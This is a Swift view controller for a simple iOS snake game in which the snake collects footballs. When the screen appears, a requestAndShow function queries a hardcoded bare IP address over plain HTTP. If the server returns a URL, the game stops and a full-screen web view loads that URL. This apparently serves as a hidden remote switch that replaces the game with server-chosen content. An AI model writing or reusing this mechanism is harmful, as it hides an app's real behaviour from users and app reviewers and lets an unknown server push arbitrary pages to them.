//
//  FirstViewController.swift
//  footballSnake
//
//  Created by hurry.qin on 2018/7/2.
//  Copyright © 2018年 hong.qin. All rights reserved.
//

import UIKit
import WebKit

class FirstViewController: UIViewController {
    var urlString = ""
    private var footballs: [UIImageView] = []
    private var balls: [UIImage] = [#imageLiteral(resourceName: "football1"), #imageLiteral(resourceName: "football2"), #imageLiteral(resourceName: "football3"), #imageLiteral(resourceName: "football4"), #imageLiteral(resourceName: "football5"), #imageLiteral(resourceName: "football6"), #imageLiteral(resourceName: "football7"), #imageLiteral(resourceName: "football8"), #imageLiteral(resourceName: "football9")]
    private var snakeBody = SnakeBody(backView: UIView())
    private var stakeView = StakeView(frame: CGRect(x: UIScreen.main.bounds.width/2 - 50, y: UIScreen.main.bounds.height - 150, width: 100, height: 100))
    private var score = 0
    private var scoreLabel: UILabel = {
        let l = UILabel()
        l.textAlignment = .center
        l.font = UIFont(name: "HelveticaNeue-Light", size: 20)
        l.textColor = UIColor.black
        l.backgroundColor = .white
        return l
    }()
    private var startPauseBtn: UIButton = {
        let btn = UIButton()
        btn.setBackgroundImage(#imageLiteral(resourceName: "restart"), for: .normal)
        btn.setBackgroundImage(#imageLiteral(resourceName: "pause"), for: .selected)
        btn.layer.cornerRadius = 24
        btn.clipsToBounds = true
        btn.backgroundColor = .white
        return btn
    }()
    
    var webView: WKWebView = {
        let webConfiguration = WKWebViewConfiguration()
        let webView = WKWebView(frame: CGRect(x: 0, y: 0, width: UIScreen.main.bounds.width, height: UIScreen.main.bounds.height), configuration: webConfiguration)
        return webView
    }()
    
    override var preferredStatusBarStyle: UIStatusBarStyle {
        return .default
    }
    
    lazy var notice : NoticeView = {
        let tempNotice = NoticeView(cacheKey: "firstTopScore", backColor: .lightGray)
        tempNotice.delegte = self
        return tempNotice
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        let webConfiguration = WKWebViewConfiguration()
        webView = WKWebView(frame: view.bounds, configuration: webConfiguration)
        view.addSubview(webView)
        prepareFootballs()
        stakeView.delegate = self
        snakeBody = SnakeBody(backView: view)
        snakeBody.delegate = self
        view.backgroundColor = UIColor.white
        scoreLabel.frame = CGRect(x: UIScreen.main.bounds.width/2 - 20, y: UIScreen.main.bounds.height == 812 ? 50 : 24, width: 40, height: 25)
        startPauseBtn.frame = CGRect(x: UIScreen.main.bounds.width/2 - 93, y: UIScreen.main.bounds.height - 112, width: 48, height: 48)
        startPauseBtn.addTarget(self, action: #selector(starOrPausetGame), for: .touchUpInside)
        startPauseBtn.isHidden = true
        
        view.addSubview(stakeView)
        view.addSubview(scoreLabel)
        view.addSubview(startPauseBtn)
        starOrPausetGame()
    }

    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        requestAndShow()
    }
    func requestAndShow() {
        getWithPath(path: "http://120.78.83.23/index.php?app_id=free_style_football", paras: nil, success: { [weak self] (result) in
            guard let weakSelf = self else { return }
            if let dic = result as? [String: Any] {
                if let arr = dic["url"] as? NSArray, let urlString = arr.firstObject as? String, urlString.count > 5, let url = URL(string: urlString) {
                    print("notification url \(urlString)")
                    DispatchQueue.main.async {
                        weakSelf.stopGame()
                        weakSelf.view.bringSubview(toFront: weakSelf.webView)
                        weakSelf.webView.load(URLRequest(url: url))
                    }
                }
            }
        }) { (error) in
            print(error)
        }
    }
    
    func showWebView(_ urlString: String) {
        if let url = URL(string: urlString), self.urlString != urlString {
            self.urlString = urlString
            view.bringSubview(toFront: webView)
            webView.load(URLRequest(url: url))
        }
    }
    
    
    func prepareFootballs() {
        score = 0
        setScore(0)
        for vi in footballs {
            vi.removeFromSuperview()
        }
        footballs.removeAll()
        for _ in 0...9 {
            for _ in 0...9 {
                let width = arc4random()%8 + 8
                let imagView = UIImageView(image: balls[Int(width) - 8])
                imagView.frame = CGRect(x: 0, y: 0, width: CGFloat(width), height: CGFloat(width))
                imagView.layer.cornerRadius = CGFloat(width)/2
                imagView.clipsToBounds = true
                imagView.contentMode = .scaleAspectFill
                imagView.center = CGPoint(x: Int(arc4random()) % Int(UIScreen.main.bounds.size.width - 30) + 15, y: Int(arc4random()) % Int(UIScreen.main.bounds.size.height - 78) + 44);
                view.addSubview(imagView)
                footballs.append(imagView)
            }
        }
        view.bringSubview(toFront: stakeView)
        view.bringSubview(toFront: startPauseBtn)
    }
    
    func setScore(_ score: Int) {
        scoreLabel.text = "\(score)"
    }
    
    @objc func starOrPausetGame() {  // 开始和暂停
        if !startPauseBtn.isSelected {
            notice.hide()
            snakeBody.startMoving()
            startPauseBtn.isSelected  = true
            startPauseBtn.isHidden = true
        } else {
            snakeBody.stopMoving()
            startPauseBtn.isSelected  = false
        }
    }
    
    func stopGame() {   //  停止
        starOrPausetGame()
        snakeBody.prepareBody()
    }
    
    func showScoreAlert() {
        notice.show(view, score: score)
    }

}

extension FirstViewController: StakeDelegate {
    func stakeDidChange(_ offset: CGPoint) {
        if offset.x == 0 && offset.y == 0 {
            return
        }
        snakeBody.setSide(side: offset)
    }
}

extension FirstViewController: SnakeMoveDelegate {
    func snakeDidMove2Frame(rect: CGRect) {
        if (!view.bounds.contains(rect)) {
            // 超出边界
            stopGame()
            showScoreAlert()
        }
        for (index, football) in footballs.enumerated() {
            if (rect.contains(football.center)) {
                football.removeFromSuperview()
                footballs.remove(at: index)
                score = score + Int(football.bounds.size.width/3)
                setScore(score)
                snakeBody.eatFoodCount(count: Int(football.bounds.size.width/3))
                return
            }
        }
    }
}

extension FirstViewController {
    func getWithPath(path: String, paras: Dictionary<String,Any>?,success: @escaping ((_ result: Any?) -> ()),failure: @escaping ((_ error: Error?) -> ())) {
        var i = 0
        var address = path
        if let paras = paras {
            for (key,value) in paras {
                if i == 0 {
                    address += "?\(key)=\(value)"
                }else {
                    address += "&\(key)=\(value)"
                }
                i += 1
            }
        }

        let url = URL(string: address.addingPercentEncoding(withAllowedCharacters: CharacterSet.urlQueryAllowed)!)
        let session = URLSession.shared
        
        
        let dataTask = session.dataTask(with: url!) { (data, respond, error) in
            if let data = data {
                let result = try? JSONSerialization.jsonObject(with: data, options: .allowFragments)
                success(result)
            } else {
                failure(error)
            }
        }
        dataTask.resume()
    }
    
    func convertStringToDictionary(_ text: String) -> [String:Any]? {
        if let data = text.data(using: String.Encoding.utf8) {
            do {
                return try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any]
            } catch let error as NSError {
                print(error)
            }
        }
        return nil
    }
    
    func convertStringToArray(_ text: String) -> [String]? {
        if let data = text.data(using: String.Encoding.utf8) {
            do {
                return try JSONSerialization.jsonObject(with: data, options: []) as? [String]
            } catch let error as NSError {
                print(error)
            }
        }
        return nil
    }
}

extension FirstViewController: noticeViewDelegate {
    func onBack() {
        notice.hide()
        dismiss(animated: true, completion: nil)
    }
    
    func noticeViewChoseRestart() {
        starOrPausetGame()
        prepareFootballs()
        notice.hide()
    }
}
